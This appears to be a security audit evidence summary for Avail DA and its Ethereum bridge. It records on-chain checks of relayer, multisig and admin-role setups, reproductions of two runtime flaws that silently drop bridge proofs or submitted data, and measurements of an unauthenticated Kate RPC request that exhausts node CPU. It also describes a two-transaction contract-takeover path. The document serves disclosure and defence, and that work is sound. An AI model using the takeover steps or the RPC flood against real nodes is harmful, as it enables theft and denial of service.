# Avail Evidence Summary

This page summarizes the verification evidence collected for Avail DA threat findings. On-chain results are from Ethereum mainnet and Avail mainnet using `cast` (Foundry) and Substrate RPC calls. Runtime and RPC findings (AVL-01, AVL-02, AVL-03) are reproduced end-to-end against a self-hosted node running the mainnet runtime (specVersion 51); every conclusion traces to a raw response or measurement log.

**Verification date**: 2026-05-21 to 2026-06-03
**Tools**: cast (Foundry), curl (Substrate RPC), avail-js-sdk + @polkadot/api (runtime PoCs), perf / pidstat / mpstat (CPU measurement)
**RPC endpoints**: `https://ethereum-rpc.publicnode.com` (Ethereum), `https://avail-rpc.publicnode.com` (Avail)

---

## VectorX Single Relayer Verification (AVL-04)

The VectorX DA attestation bridge operates with a single approved relayer EOA.

### On-Chain State

```bash
# Confirm relayer is an EOA (no contract code)
cast code 0x27BF7DE579c5779DBfBB8e9D69999E4d1370787D --rpc-url $ETH_RPC
# Result: 0x (no code = EOA)

# Relayer nonce and balance
cast nonce 0x27BF7DE579c5779DBfBB8e9D69999E4d1370787D --rpc-url $ETH_RPC
# Result: 2632

cast balance 0x27BF7DE579c5779DBfBB8e9D69999E4d1370787D --rpc-url $ETH_RPC --ether
# Result: 0.820... ETH

# Relayer approval status
cast call 0x02993cdC11213985b9B13224f3aF289F03bf298d \
  "approvedRelayers(address)(bool)" \
  0x27BF7DE579c5779DBfBB8e9D69999E4d1370787D --rpc-url $ETH_RPC
# Result: true

# Permissioned mode active
cast call 0x02993cdC11213985b9B13224f3aF289F03bf298d \
  "checkRelayer()(bool)" --rpc-url $ETH_RPC
# Result: true

# Previous relayer revoked (rotation history)
cast call 0x02993cdC11213985b9B13224f3aF289F03bf298d \
  "approvedRelayers(address)(bool)" \
  0x3243552F3BcbcE720Db6f5ad0C1B7cd15458392D --rpc-url $ETH_RPC
# Result: false
```

### Code-Level Verification (SP1Vector.sol)

Source code analysis of `commitHeaderRange()` confirms:
- Zero references to `block.timestamp` (no on-chain timing enforcement)
- No cooldown, rate limit, or heartbeat mechanism
- No staleness detection -- the contract has no way to know the relayer has stopped
- Client-side timing is controlled by operator.rs constants: `LOOP_INTERVAL_MINS=60`, `BLOCK_UPDATE_INTERVAL=360`, `PROOF_TIMEOUT_SECS=1800`
- `setRelayerApproval()` does not emit an event (unlike `removeHeaderHash` which emits `HeaderHashRemoved`), creating an observability gap

### Anvil Fork PoC (3 Tests)

```bash
# PoC-1: Single relayer access control
# Unapproved address calls commitHeaderRange() -> RelayerNotApproved revert
# PASS

# PoC-2: Staleness detection absence
# Query latestBlock, compare to current Avail block
# No on-chain function or event for staleness detection
# PASS

# PoC-3: Guardian ZK bypass (intended emergency mechanism)
# updateBlockRangeData() injects commitment without ZK proof
# This is designed behavior for emergency recovery
# PASS
```

### Relay Pattern Metrics

| Metric | Value |
|---|---|
| Average relay interval | ~120 minutes |
| Batch size | ~358 blocks |
| Gas per commit | 458,612 gas |
| Active relayers | 1 (0x27BF...) |
| Previous relayer | 0x3243... (revoked) |

---

## SP1VerifierGateway Multisig Analysis (AVL-07)

The ZK proof verifier routing is controlled by a 2-of-3 multisig with key holder overlap.

```bash
# Threshold
cast call 0xCafEf00d348Adbd57c37d1B77e0619C6244C6878 \
  "getThreshold()(uint256)" --rpc-url $ETH_RPC
# Result: 2

# Owners
cast call 0xCafEf00d348Adbd57c37d1B77e0619C6244C6878 \
  "getOwners()(address[])" --rpc-url $ETH_RPC
# Result:
#   0xBaB2c2aF5b91695e65955DA60d63aD1b2aE81126
#   0x72Ff26D9517324eEFA89A48B75c5df41132c4f54  <-- also Gov Multisig #4
#   0x9395e83720bf2D8ac6435f9c520b48E289Cb8885
```

Owner #2 (`0x72Ff...4f54`) is the same address as Avail Governance Multisig 1 owner #4. This means a Succinct signer + this shared signer (2 people) can change the SP1 verifier route, potentially accepting false ZK proofs.

---

## Governance Multisig Cross-Analysis (AVL-08)

Three multisigs share overlapping key holders, reducing effective independence.

### Avail Governance Multisig 1 (4-of-7)

```bash
cast call 0x7F2f87B0Efc66Fea0b7c30C61654E53C37993666 \
  "getThreshold()(uint256)" --rpc-url $ETH_RPC
# Result: 4

cast call 0x7F2f87B0Efc66Fea0b7c30C61654E53C37993666 \
  "getOwners()(address[])" --rpc-url $ETH_RPC
# Result: 7 addresses (all EOAs)
# Gnosis Safe v1.3.0, nonce=15
```

### Key Holder Overlap Matrix

| Address (truncated) | Gov (4/7) | Pauser (3/5) | SP1 (2/3) |
|---|---|---|---|
| 0x70a4... | Yes | Yes | No |
| 0x340e... | Yes | Yes | No |
| 0xAD37... | Yes | Yes | No |
| **0x72Ff...** | **Yes (#4)** | **Yes (#4)** | **Yes (#2)** |
| 0x1fbA... | Yes | No | No |
| 0xBe1D... | Yes | No | No |
| 0x4983... | Yes | Yes | No |

**0x72Ff...4f54** participates in all three multisigs. 4 of 5 Pauser Multisig signers are identical to Gov Multisig signers. The effective independence between Governance and Pauser is minimal -- compromising the Gov multisig implicitly compromises the Pauser (3 of the 4 overlapping signers exceed the 3/5 Pauser threshold).

---

## Deployer Admin Role Verification (AVL-06)

The deployer EOA retains DEFAULT_ADMIN_ROLE, enabling a 2-transaction VectorX takeover.

```bash
# Deployer retains DEFAULT_ADMIN_ROLE
cast call 0x02993cdC11213985b9B13224f3aF289F03bf298d \
  "hasRole(bytes32,address)(bool)" \
  "0x0000000000000000000000000000000000000000000000000000000000000000" \
  0xDEd0000E32f8F40414d3ab3a830f735a3553E18e --rpc-url $ETH_RPC
# Result: true

# Deployer does NOT have TIMELOCK_ROLE (revoked)
cast call 0x02993cdC11213985b9B13224f3aF289F03bf298d \
  "hasRole(bytes32,address)(bool)" \
  "<TIMELOCK_ROLE_HASH>" \
  0xDEd0000E32f8F40414d3ab3a830f735a3553E18e --rpc-url $ETH_RPC
# Result: false

# TIMELOCK_ROLE admin = DEFAULT_ADMIN_ROLE (0x00)
cast call 0x02993cdC11213985b9B13224f3aF289F03bf298d \
  "getRoleAdmin(bytes32)(bytes32)" \
  "<TIMELOCK_ROLE_HASH>" --rpc-url $ETH_RPC
# Result: 0x0000...0000 (DEFAULT_ADMIN_ROLE)

# Deployer is an EOA
cast code 0xDEd0000E32f8F40414d3ab3a830f735a3553E18e --rpc-url $ETH_RPC
# Result: 0x (no code = EOA)

cast nonce 0xDEd0000E32f8F40414d3ab3a830f735a3553E18e --rpc-url $ETH_RPC
# Result: 1107 (active account)
```

### Attack Path

Since DEFAULT_ADMIN_ROLE is the admin of TIMELOCK_ROLE, the deployer can:

1. `grantRole(TIMELOCK_ROLE, deployer_address)` -- grants itself upgrade authority
2. `upgradeTo(malicious_implementation)` -- replaces VectorX with arbitrary code

This bypasses the 4-of-7 governance multisig entirely. The root cause is that `Guardian.s.sol` (deployment script) has the DEFAULT_ADMIN_ROLE revocation code commented out.

---

## Bridge and Token Verification

### AvailBridge Access Control

```bash
# Bridge DEFAULT_ADMIN = TimelockController (24h delay)
cast call 0x054fd961708d8e2b9c10a63f6157c74458889f0a \
  "hasRole(bytes32,address)(bool)" \
  "0x0000000000000000000000000000000000000000000000000000000000000000" \
  0x45828180bbE489350D621d002968A0585406d487 --rpc-url $ETH_RPC
# Result: true

# TimelockController minimum delay
cast call 0x45828180bbE489350D621d002968A0585406d487 \
  "getMinDelay()(uint256)" --rpc-url $ETH_RPC
# Result: 86400 (24 hours)
```

### AVAIL Token (AVL-09)

```bash
# Token is immutable (no owner)
cast call 0xeeb4d8400aeefafc1b2953e0094134a887c76bd8 \
  "owner()(address)" --rpc-url $ETH_RPC
# Result: revert (no owner function = immutable)

# Total supply
cast call 0xeeb4d8400aeefafc1b2953e0094134a887c76bd8 \
  "totalSupply()(uint256)" --rpc-url $ETH_RPC
# Result: ~791,099,641 AVAIL (18 decimals)
```

Mint/burn authority is restricted to the Bridge contract (0x054f...). A malicious Bridge upgrade (via TimelockController 24h path or VectorX no-timelock path) could enable unlimited token minting.

---

## Avail Chain Verification

### Validator Set (AVL-10)

```bash
# Session.Validators storage
curl -s "https://avail-rpc.publicnode.com" \
  -d '{"jsonrpc":"2.0","method":"state_getStorage",
  "params":["0xcec5070d609dd3497f72bde07fc96ba088dcde934c658227ee1dfafcd6e16903"],"id":1}'
# SCALE decode -> 105 active validators
```

| Metric | Value |
|---|---|
| Active validators | 105 |
| Max validators | 1,200 |
| Utilization | 8.75% |
| Nakamoto coefficient | ~34 |
| Top validator share | 1.06% |
| Max/min stake ratio | 1.20x (Phragmen equalization) |

### Slashing Status (AVL-11)

```bash
# ActiveEra
# state_getStorage -> SCALE decode -> 688

# UnappliedSlashes for era 688
# state_getStorage -> null (empty = no pending slashes)
```

688 eras of operation with zero slashing events applied. The slashing infrastructure exists in runtime metadata (67 references) but has never been triggered.

---

## MultiAddress Index Bridge Proof Omission (AVL-01)

A `Vector::send_message` signed as `MultiAddress::Index(0)` was reproduced end-to-end: the runtime dispatches it and emits `MessageSubmitted`, but the bridge leaf is dropped from the header extension, so `kate_queryDataProof` returns no proof. The `Address::Id` baseline yields a full proof at the same tx index, validating the harness and the proof query.

### Test Setup

| Item | Value |
|---|---|
| Chain | Avail Development Network (`--dev`), specVersion 51 |
| Runtime commit | `510ee26dde6c3e678a8b8f1726dd99039de39276` (same as mainnet) |
| Binary | `availj/avail:v2.3.4.3` |
| Script | `poc_da001/poc_multiaddr_index.js` (avail-js-sdk 0.4.2, @polkadot/api 16.5.6) |
| Note | Functional event-vs-proof test; node under ARM64 emulation, so only correctness is asserted, not timing |

### Reproduction

```bash
node poc_multiaddr_index.js
# sudo-sets a whitelisted domain, claims index 0, then submits send_message
# first as Address::Id (baseline), then as Address::Index(0) (attack)
```

### Raw Output

```text
# BASELINE — send_message with Address::Id
MessageSubmitted: YES   txIndex: 1   block: 0x72f9aa39...d7f0bc
kate_queryDataProof: PROOF EXISTS

# ATTACK — send_message with Address::Index(0), byte-swapped raw extrinsic
Normal (Id)  signed hex prefix: 0x49028400d43593c715fdd31c6114...
Attack (Index) hex prefix:      0xcd0184010001b0dd8ee90eb8a778...
Address byte changed: 0x00(Id) -> 0x01 0x00(Index 0)
included in block: 0x14dcfcac...0735fb7d   txIndex: 1
MessageSubmitted event: YES   <- runtime says success
```

```json
{"jsonrpc":"2.0","error":{"code":1,"message":"Cannot fetch tx data at tx index 1 at block 0x14dcfcac51259af1383e0ff6418642af3815df81530316f992beb7d20735fb7d"},"id":1}
```

Both calls land at tx index 1. The `Id` baseline returns a full bridge proof; the `Index(0)` attack emits `MessageSubmitted` but the proof is absent. The Index-addressed extrinsic was accepted by the runtime, not rejected.

### Code-Level Confirmation

- `avail-core/core/src/asdr.rs` — `MaybeCaller::caller()` returns `Some` only for the `Id` variant; `Index` yields `None`.
- `runtime/src/transaction_filter.rs:127` — `let from = *caller?.as_ref();` short-circuits to `None`, dropping the bridge leaf.

---

## Proxy-Wrapped submitData DA Bypass (AVL-02)

A `DataAvailability::submit_data` wrapped in `Proxy::proxy` (AppId 0) was reproduced end-to-end: the runtime emits `DataSubmitted` and charges fees, but the data is dropped from the Kate grid, so `kate_queryDataProof` returns "Cannot fetch tx data". A direct `submit_data` baseline at the same tx index returns a full proof.

### Test Setup

| Item | Value |
|---|---|
| Chain | Avail Development Network (`--dev`), specVersion 51 |
| Runtime commit | `510ee26dde6c3e678a8b8f1726dd99039de39276` (same as mainnet) |
| Binary | `availj/avail:v2.3.4.3` |
| Script | `poc_da001/run_poc.js` (avail-js-sdk 0.4.2, @polkadot/api 16.5.6) |

### Reproduction

```bash
node run_poc.js
# baseline: direct submitData; attack: Bob.proxy.proxy(real=Alice, submitData) with AppId=0
```

### Raw Output

```text
# BASELINE — direct dataAvailability.submitData
DataSubmitted event: YES   block: 0xe9c8b3ee...06f249f7   txIndex: 1
kate_queryDataProof: PROOF EXISTS

# ATTACK — Bob.proxy.proxy(real=Alice, call=submitData)
tx hash : 0xe12dc891...6439f026
block   : 0x44f4bdb6...936878bb   txIndex: 1
DataSubmitted event: YES   <- chain says DA submission successful
event.who : 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY
data_hash : 0x6294e94c037fadc09d9196dc0743478e9d8ffb298c11ff0f5ed0012c2a3e0fdc
```

```json
{"code":1,"message":"Cannot fetch tx data at tx index 1 at block 0x44f4bdb6b271d4702d0b6e4c5b6613dc9f13a1defc9e7decbeecfea2936878bb"}
```

### Scope Note — the proxy path blocks send_message

The same proxy wrapper applied to `Vector::send_message` was rejected at validation with `1010: Invalid Transaction: Custom error: 141`; the call never entered a block and no event fired. `recursive_proxy_call` blocks `send_message` but not `submit_data`, so only `submit_data` slips through the proxy path. The bridge-proof omission outcome is instead reachable via the `MultiAddress::Index` path (AVL-01), not via a proxy-wrapped `send_message`.

### Code-Level Confirmation

- `pallets/dactr/src/extensions/check_app_id.rs:76` — `AppId(0)` returns `Ok(())`, bypassing app-id validation.
- `pallets/dactr/src/extensions/check_batch_transactions.rs` — `recursive_batch_call` (line 193) blocks `submit_data`; `recursive_proxy_call` (line 232) does not.
- `runtime/src/transaction_filter.rs:38` — `nb_iterations > 0` returns `None`, dropping the wrapped call from DA extraction.

---

## Kate RPC Unauthenticated KZG Computation (AVL-03)

A single unauthenticated `kate_queryProof` call forces a full data-availability grid rebuild for the target block. Measured on a native x86 GCP host with `perf`: one 1-cell request on a full 4 MB block costs ~0.197 core-seconds, the cost is independent of how many cells are requested and is never cached, and ~16 concurrent connections saturate all 16 cores while co-tenant RPC latency degrades ~1180x. This is a node-level availability finding; it does not affect consensus, safety, or data integrity.

### Test Setup

| Item | Value |
|---|---|
| Cloud / instance | GCP n2-standard-16, zone us-central1-a |
| vCPU | 16 (x86_64, native, not emulated) |
| OS | Ubuntu 24.04.4 LTS, kernel 6.17.0-1016-gcp |
| Node | avail-node 2.3.4-510ee26 (commit 510ee26), native amd64 from `availj/avail:v2.3.4.3` |
| Run mode | host process: `avail-node --dev --rpc-port 9944 --rpc-methods unsafe --enable-kate-rpc --tmp` |
| Runtime | specName avail, specVersion 51 |
| Tools | node v20.20.2 (HTTP keep-alive harness), avail-js-sdk (block fill), perf v6.17, pidstat/mpstat |

Blocks built, with actual grid dims read from the header V3 commitment:

| Label | Block | rows x cols | grid bytes |
|---|---|---|---|
| 1 KB | #19 | 1 x 64 | 2,048 |
| 100 KB | #20 | 8 x 512 | 131,072 |
| 1 MB | #21 | 128 x 512 | 2,097,152 |
| 4 MB (full) | #14 | 256 x 512 | 4,194,304 |

The 4 MB block is a true full mainnet-dimension block (256 x 512 x 32 B), built from five 1 MiB `submit_data` calls.

> PMU note: this GCP guest exposes no hardware PMU, so `perf` `cycles`/`instructions` report `<not supported>`. The authoritative CPU-time metric is `task-clock` (software counter), which yields core-seconds directly. The grid-build path is single-threaded, so per-request wall time approximates per-request core-time.

### Single Request (raw)

```bash
# 1-cell queryProof on the 4 MB block (#14) -> returns a KZG proof; median wall 197.9 ms
curl -s -d '{"jsonrpc":"2.0","id":1,"method":"kate_queryProof","params":[[{"row":0,"col":0}],"0x433d1c59...0e194401"]}' \
  -H "Content-Type: application/json" http://localhost:9944

# Mainnet liveness (bounded, no stress): endpoint enabled and anonymous
curl -s -d '{"jsonrpc":"2.0","id":1,"method":"kate_blockLength","params":[]}' \
  -H "Content-Type: application/json" https://mainnet-rpc.avail.so/rpc
# -> {"max":[4194304,4194304,4194304],"cols":512,"rows":256,"chunkSize":32}
# kate_queryProof is exposed without authentication on mainnet
```

### M1 — Core-seconds per request (4 MB block, perf)

`perf stat -e task-clock -p <pid> -- sleep 25` over a single-worker 1-cell loop:

| Metric | Value |
|---|---|
| Requests in window | 127 |
| task-clock | 25.000 s ("1.000 CPUs utilized") |
| core-seconds / req | 0.1969 |
| median single-request wall | 197.9 ms |

One 1-cell request keeps one core fully busy for ~0.2 s.

### M2 — Cost vs cell count (grid build dominates)

| Cells | p50 wall (ms) | rps |
|---|---|---|
| 1 | 199.4 | 5.13 |
| 8 | 208.7 | 4.88 |
| 32 | 229.4 | 4.38 |
| 64 | 269.4 | 3.75 |

64x more cells raises cost only ~1.35x. Asking for 1 cell costs almost the same as 64.

### M3 — No cache (distinct cell each iteration)

| Run | p50 wall (ms) |
|---|---|
| Run A | 199.3 |
| Run B | 199.7 |

Every request rebuilds the grid; no warm-up benefit.

### M4 — Cost vs block size

| Block | grid | p50 wall (ms) | core-s / req |
|---|---|---|---|
| 1 KB | 1 x 64 | 0.21 | 0.000158 |
| 100 KB | 8 x 512 | 4.82 | 0.00518 |
| 1 MB | 128 x 512 | 101.2 | 0.1004 |
| 4 MB | 256 x 512 | 199.6 | 0.1965 |

The 4 MB full block costs ~1,245x the 1 KB block per request.

### M5 — Concurrency CPU saturation (16 vCPU, 1600% max)

Idle baseline: node 0.7% CPU, machine 100% idle.

| N | per-req wall (ms) | rps | node CPU% avg (peak) | machine idle% |
|---|---|---|---|---|
| 1 | 199.9 | 5.05 | 100.1 (101) | 93.8 |
| 2 | 203.1 | 9.90 | 199.9 (201) | 87.5 |
| 4 | 203.5 | 19.75 | 397.9 (400) | 74.9 |
| 8 | 208.6 | 38.55 | 795.6 (799) | 50.0 |
| 16 | 330.8 | 48.75 | 1593.6 (1596) | 0.0 |
| 32 | 652.2 | 49.85 | 1595.4 (1598) | 0.0 |
| 50 | 1010.3 | 50.55 | 1594.5 (1597) | 0.0 |

CPU scales linearly at ~100% per connection until N=16 pins all 16 cores (0% machine idle). Beyond saturation, throughput plateaus (~50 rps) and latency grows from queueing.

### M6 — Victim co-tenant latency (during N=50 attack)

| RPC | idle p50 (ms) | under attack p50 (ms) | max (ms) | degradation |
|---|---|---|---|---|
| system_health | 0.93 | 1097.3 | 1478.0 | ~1180x |
| chain_getHeader | 0.90 | 1065.6 | 1566.9 | ~1180x |

A sub-millisecond health check takes over a second during the attack.

### M7 — Asymmetry

One unauthenticated connection (1 request in flight) pins exactly 1.00 of 16 cores; each added connection adds another full core; ~16 connections (a single laptop) saturate the whole node. The attacker sends a ~100-byte request asking for 1 cell with no auth and no rate limit; the server builds the entire 4 MB grid (~0.197 core-seconds) uncached, every time.

### Honest Magnitude

The per-request cost is modest in absolute terms (~0.2 core-seconds), roughly 70x cheaper than the EigenDA GetBlobCommitment KZG path (EDA-02, ~14 core-seconds at 16 MiB). The severity is the asymmetry and the absence of any handler-level rate limit, not a single-request kill. Impact is confined to the attacked node (CVSS Scope Unchanged); it degrades the data-serving and DAS-fallback role of Kate-RPC-enabled nodes, not chain liveness.
